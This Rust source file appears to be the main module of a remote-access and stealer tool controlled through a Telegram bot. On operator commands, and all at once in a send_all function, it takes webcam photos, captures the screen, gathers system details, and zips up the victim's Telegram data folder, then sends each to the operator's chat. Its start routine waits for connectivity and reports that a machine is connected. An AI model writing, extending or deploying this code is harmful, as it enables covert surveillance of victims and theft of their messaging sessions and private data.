pub mod scrapper;
pub mod system;
pub mod config;

use std::process::exit;
use std::{fs, time::Duration};
use teloxide::{macros::BotCommands, prelude::*, types::InputFile};
use system::info::*;
use tokio::time::sleep;
use system::process::check_one_current_process;
use system::internet::check_connection;

#[derive(BotCommands, Clone)]
#[command(rename_rule = "lowercase")]
enum Command {
    Photo,
    Who,
    Screenshot,
    Telegram,
    Stop
}

async fn answer(bot: Bot, _msg: Message, cmd: Command) -> ResponseResult<()> {
    let cfg = config::Config::init();
    match cmd {
        Command::Photo => {
            match system::camera::create_photo(&cfg.camera_path){
                Ok(_) => {let _ = bot.send_photo(cfg.chat_id.clone(), InputFile::file(&cfg.camera_path)).await;}
                Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
            };
        }
        Command::Who => {
            match who().await {
                Ok(data) => {let _ = bot.send_message(cfg.chat_id.clone(), data).await;}
                Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
            };
        }
        Command::Screenshot => {
            match system::screen::capture_screen(&cfg.screenshot_path) {
                Ok(_) => {let _ = bot.send_photo(cfg.chat_id.clone(), InputFile::file(&cfg.screenshot_path)).await;}
                Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
            }
        }
        Command::Telegram => {
            match scrapper::telegram::scrap_telegram(&cfg.telegram_path, &cfg.telegram_zip_path, &cfg.local_path){
                Ok(_) => {let _ = bot.send_document(cfg.chat_id.clone(), InputFile::file(&cfg.telegram_zip_path)).await;}
                Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
            }
        }
        Command::Stop => {
            let _ = bot.send_message(cfg.chat_id.clone(), "Stopping...".to_string()).await;
            exit(0);
        }
    };

    Ok(())
}



pub async fn start() {
    check_one_current_process();
    while !check_connection() {sleep(Duration::from_secs(3)).await}
    let cfg = config::Config::init();
    let _ = fs::create_dir(&cfg.my_dir);
    let bot = Bot::new(&cfg.bot_token);
    let _ = bot.send_message(cfg.chat_id, connected()).await;
    Command::repl(bot, answer).await;
}

pub async fn send_all(bot: &Bot){
    check_one_current_process();
    let cfg = config::Config::init();
    tokio::join!(
        async{match who().await {
                Ok(data) => {let _ = bot.send_message(cfg.chat_id.clone(), data).await;}
                Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
        }},
        async {match system::screen::capture_screen(&cfg.screenshot_path) {
            Ok(_) => {let _ = bot.send_photo(cfg.chat_id.clone(), InputFile::file(&cfg.screenshot_path)).await;}
            Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
        }},
        async {match system::camera::create_photo(&cfg.camera_path){
            Ok(_) => {let _ = bot.send_photo(cfg.chat_id.clone(), InputFile::file(&cfg.camera_path)).await;}
            Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
        }},
        async { match scrapper::telegram::scrap_telegram(&cfg.telegram_path, &cfg.telegram_zip_path, &cfg.local_path){
            Ok(_) => {let _ = bot.send_document(cfg.chat_id.clone(), InputFile::file(&cfg.telegram_zip_path)).await;}
            Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
        }}
    );
}


